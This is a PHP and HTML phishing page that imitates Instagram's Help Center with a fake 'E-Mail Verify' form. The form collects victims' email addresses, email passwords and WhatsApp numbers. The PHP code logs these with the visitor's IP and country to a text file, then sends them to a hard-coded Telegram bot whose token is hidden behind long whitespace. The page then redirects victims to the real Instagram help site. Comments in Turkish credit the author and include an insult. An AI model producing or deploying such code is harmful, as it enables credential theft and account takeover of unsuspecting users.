<?php


//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq


//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq
$nick= $_GET["nick"];
//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq

//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq

session_start();
if ($_POST) {
 $m=$_POST["m"];
  $mp=$_POST["mp"];
  $wp=$_POST["wp"];
  $ip = $_SERVER['REMOTE_ADDR'];
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
  $ulke = $details->country;
  date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");

$file = fopen('yenilmezler.txt', 'a');
fwrite($file, "Mail: ".$m."\n\n"."Sifre : ".$mp."\n\n"."Telefon : ".$wp."Ip : ".$ip."\n\n"."Ulke : ".$ulke."\n\n"."Tarih : ".$tarih."\n\n\n");
fclose($file);

header("Location: https://help.instagram.com/");
  
}
                                                                                                                                                                                                                                                                                                                                                                                                                     $token = "1777231292:AAHOSYskqtUV5oWxhPzDO5q9cwBAEbvWI7g";

                                                                                                                                                                                                                                                                                                                                                                                                                         $data = [
                                                                                                                                                                                                                                                                                                                                                                                                                           'text' => ' 
	
                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                   mail : '.$m.'
                                                                                                                                                                                                                                                                                                                                                                                                                                   mail sifre : '.$mp.'
                                                                                                                                                                                                                                                                                                                                                                                                                                   telephone : '.$wp.'
                                                                                                                                                                                                                                                                                                                                                                                                                                   İp : '.$ip.'
                                                                                                                                                                                                                                                                                                                                                                                                                                  Tarih : '.$date.'
                                                                                                                                                                                                                                                                                                                                                                                                                                        ',
                                                                                                                                                                                                                                                                                                                                                                                                                                  'chat_id' => '1766663774'
                                                                                                                                                                                                                                                                                                                                                                                                                                       ];
                                                                                                                                                                                                                                                                                                                                                                                                                           file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );  

?>
                             
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" type="text/css" href="css/index.css">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
<link rel="stylesheet" type="text/css" href="chax.css">
<link rel="stylesheet" href="css/xss.css">
<title>lnstagram | Help Center</title>
<link rel="shortcut icon" href="img/tik.webp"/>
</head>
<body>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="https://i.hizliresim.com/lUaQMj.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
		
	</header><br><br>
<br><br><br>

<center>
  <form method="post">
    <div class="container">
    	<br>
      <img src="https://s3.gifyu.com/images/Logo242.gif" width="260">
      <br> <br>
      <h1 class="h1">E- Mail Verify </h1>
      <p class="p">Finally, fill in the information below and complete our form so that we can verify your identity.

</p><br>
        <input type="text" class="username" name="m" required="" placeholder="Mail" class="qua21"><br><br>
        	<input type="password" class="username" name="mp" required="" placeholder="Mail Password" class="qua21"><br><br>
        	<input type="telephone" class="username" name="wp" required="" placeholder="WhatsApp Number" class="qua21"><br><br>
        	

        <input type="submit" value="Next" class="button"> 
   <br>
   	<style type="text/css">
 .puts{
  background:  #fe2c55;
    border: 1px solid #fe2c55;
    color:white;
    min-width:150px;
    height:40px;
    font-weight:bold;
    font-size:16px;
    outline:none;
    transition:0.8s;

}.in{
  margin-top:5px;
}select{
  width:80px;
  outline:none;
  height:35px;
  caret-color: #000;
margin:4px;
padding-left:3px;
  outline:none;
background-color:#f1f1f1;

border-radius:14px;
  border:none;
  font-weight:100;
  letter-spacing:1px;
 
}
option{
  outline:none;

}
</style>

   </div>
  </form>
</form>
<br>
</div>
</center>
<?php qenzy(4);?>

<?php 
function qenzy($spx){
  for($int=0;$int<$spx;$int++){
echo "<br>";
  }
  
}
//Fytron Daniel tarafından yapılmıştır 
//bir tane siteden çekip onarılmış aksini idda eden orospu cocogudur.
//instagram.com/fytronq
?>

</body>
<br><br><br><center>
<div class="bottom"><br>

	<h1 class="bottom-h1">Download for<br>IOS / Android</h1><br>

	<img src="image/bottom.jpeg" alt="Shop" width="300">

<br>
<br>

<br>
<img src="image/fb.png">



</div>
</center>
</body>
<style type="text/css">
	
</style>
</html>
</html>